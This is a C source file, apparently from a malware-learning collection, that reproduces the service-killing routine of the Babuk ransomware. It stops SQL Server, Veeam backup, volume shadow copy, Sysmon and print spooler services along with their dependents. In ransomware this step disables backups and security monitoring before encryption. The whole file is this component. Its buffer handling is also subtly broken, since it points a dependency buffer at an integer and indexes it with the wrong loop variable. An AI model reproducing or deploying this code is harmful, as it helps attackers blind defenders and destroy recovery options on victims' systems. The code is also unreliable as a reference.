/*
 * ╓──────────────────────────────────────────────────────────────────────────────────────╖
 * ╟──────────────────────────────────────────────────────────────────────────────────────╢
 * ║                                                                                      ║
 * ║   Description: Terminate a list of specified services in once                        ║
   ║   Credits: Babuk Ransomware                                                          ║
   ║                                                                                      ║
 * ║                                                                                      ║
   ║   Happy learning!                                                                    ║
 * ║                                                                                      ║
 * ║                                                                                      ║
 * ║																				                           ║
 * ║                                                                                      ║
 * ╙──────────────────────────────────────────────────────────────────────────────────────╜
 */

#include <windows.h>
#include <tlhelp32.h>
#include <restartManager.h>
#include <wbemprov.h>
#include <iphlpapi.h>
#include <icmpapi.h>
#include <lm.h>

static const CHAR* terminating_services[] = {"SQLPBDMS", "SQLPBENGINE", "MSSQLFDLauncher", "SQLSERVERAGENT", "MSSQLServerOLAPService", "SSASTELEMETRY", "SQLBrowser", "SQL Server Distributed Replay Client", "SQL Server Distributed Replay Controller", "MsDtsServer150", "SSISTELEMETRY150", "SSISScaleOutMaster150", "SSISScaleOutWorker150", "MSSQLLaunchpad", "SQLWriter", "SQLTELEMETRY", "MSSQLSERVER", "Veeam", "vss", "Sysmon", "Spooler"};

VOID StopServices() {
    
    SERVICE_STATUS_PROCESS sspMain;
    SERVICE_STATUS_PROCESS sspDep;

    ENUM_SERVICE_STATUSA ess;

    DWORD dwBytesNeeded;
    DWORD dwCount;

    LPENUM_SERVICE_STATUSA lpDependencies = 0;

    DWORD dwStartTime = GetTickCount();
    DWORD dwTimeout = 1000;

    // Establishing a connection to the Service Control Manager on the specified computer
    if (SC_HANDLE scManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT)) {
        for (int i = 0; i < _countof(terminating_services); i++) 
        {

    // Openining an existing service. 
    // SC_HANDLE is the handle to the Service Control Manager
    // terminating_services[i] are the services that will be opened
    if (SC_HANDLE schHandle = OpenServiceA(scManager, terminating_services[i], SERVICE_STOP | SERVICE_QUERY_STATUS)) {

    // Retrieving the current status of the specified services
        if (QueryServiceStatusEx(schHandle, SC_STATUS_PROCESS_INFO, (LPBYTE)&sspMain, sizeof(SERVICE_STATUS_PROCESS), &dwBytesNeeded)) {


            if (!EnumDependentServicesA(schHandle, SERVICE_ACTIVE, lpDependencies, 0, &dwBytesNeeded, &dwCount))
            {
                if (GetLastError() == ERROR_MORE_DATA)
                {
                    {
                        if (lpDependencies = (LPENUM_SERVICE_STATUSA)(&dwBytesNeeded))
                        {
                            // Retrieves the name and status of each service that depends on the specified service
                            if (EnumDependentServicesA(schHandle, SERVICE_ACTIVE, lpDependencies, dwBytesNeeded, &dwBytesNeeded, &dwCount))
                            {
                                ess = *(lpDependencies + i);

                                if (SC_HANDLE hDepService = OpenServiceA(scManager, ess.lpServiceName, SERVICE_STOP | SERVICE_QUERY_STATUS))
                                {
                                    // Sending a control code to a service with the 0x00000001 flag notifying that the service needs to be stopped
                                    if (ControlService(hDepService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&sspDep))
                                    {
                                        while (sspDep.dwCurrentState != SERVICE_STOPPED)
                                        {

                                            if (QueryServiceStatusEx(hDepService, SC_STATUS_PROCESS_INFO, (LPBYTE)&sspDep, sizeof(SERVICE_STATUS_PROCESS), &dwBytesNeeded))
                                            {
                                                if (sspDep.dwCurrentState == SERVICE_STOPPED || GetTickCount() - dwStartTime > dwTimeout)
                                                {
                                                    break;
                                                }
                                            }
                                        }
                                        CloseServiceHandle(hDepService);
                                    }
                                }
                            }
                            (lpDependencies);
                        }
                    }
                }
                if (ControlService(schHandle, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&sspMain))
                {
                    while (sspMain.dwCurrentState != SERVICE_STOPPED)
                    {
                        if (!QueryServiceStatusEx(schHandle, SC_STATUS_PROCESS_INFO, (LPBYTE)&sspMain, sizeof(SERVICE_STATUS_PROCESS), &dwBytesNeeded))
                        {
                            goto stop_cleanup;
                        }

                        if (sspMain.dwCurrentState == SERVICE_STOPPED)
                            break;

                        if (GetTickCount() - dwStartTime > dwTimeout)
                        {
                            goto stop_cleanup;
                        }
                    }
                }
            }
        }
        stop_cleanup:;
        CloseServiceHandle(schHandle);
        }
        }
        CloseServiceHandle(scManager);
    }
}

 
                            

int main()
{
    StopServices();
}
